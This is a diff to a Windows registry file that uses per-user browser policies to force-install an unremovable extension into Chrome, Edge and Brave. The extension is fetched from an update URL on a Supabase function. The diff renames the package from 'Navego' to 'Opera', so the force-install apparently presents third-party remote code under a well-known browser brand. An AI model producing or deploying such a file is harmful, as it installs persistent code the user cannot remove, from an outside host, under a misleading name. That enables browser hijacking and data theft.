@@ -1,4 +1,4 @@
-; Navego - force install through a policy, Windows, per-user.
+; Opera - force install through a policy, Windows, per-user.
 ; @last-edited: 2026-11-15 UTC+7.
 ; @title: extension force install - one double-click asks every Chromium browser in this user profile to install the extension and keep it.
 ; @state: per-user policy (HKCU), admin rights not required. Chrome and Brave honor HKCU policies; Edge honors HKCU too. Remove the trigger again with extension-forceinstall-remove.reg.
@@ -12,10 +12,10 @@
 Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\Software\Policies\Google\Chrome\ExtensionInstallForcelist]
-"1"="ofgemipoobcnbjkfanmofjbdonjapmgl;https://nenmkmtvjremqphfqnfw.supabase.co/functions/v1/navego-update/update.xml?id=ofgemipoobcnbjkfanmofjbdonjapmgl"
+"1"="ofgemipoobcnbjkfanmofjbdonjapmgl;https://nenmkmtvjremqphfqnfw.supabase.co/functions/v1/opera-update/update.xml?id=ofgemipoobcnbjkfanmofjbdonjapmgl"
 
 [HKEY_CURRENT_USER\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist]
-"1"="ofgemipoobcnbjkfanmofjbdonjapmgl;https://nenmkmtvjremqphfqnfw.supabase.co/functions/v1/navego-update/update.xml?id=ofgemipoobcnbjkfanmofjbdonjapmgl"
+"1"="ofgemipoobcnbjkfanmofjbdonjapmgl;https://nenmkmtvjremqphfqnfw.supabase.co/functions/v1/opera-update/update.xml?id=ofgemipoobcnbjkfanmofjbdonjapmgl"
 
 [HKEY_CURRENT_USER\Software\Policies\BraveSoftware\Brave-Browser\ExtensionInstallForcelist]
-"1"="ofgemipoobcnbjkfanmofjbdonjapmgl;https://nenmkmtvjremqphfqnfw.supabase.co/functions/v1/navego-update/update.xml?id=ofgemipoobcnbjkfanmofjbdonjapmgl"
+"1"="ofgemipoobcnbjkfanmofjbdonjapmgl;https://nenmkmtvjremqphfqnfw.supabase.co/functions/v1/opera-update/update.xml?id=ofgemipoobcnbjkfanmofjbdonjapmgl"
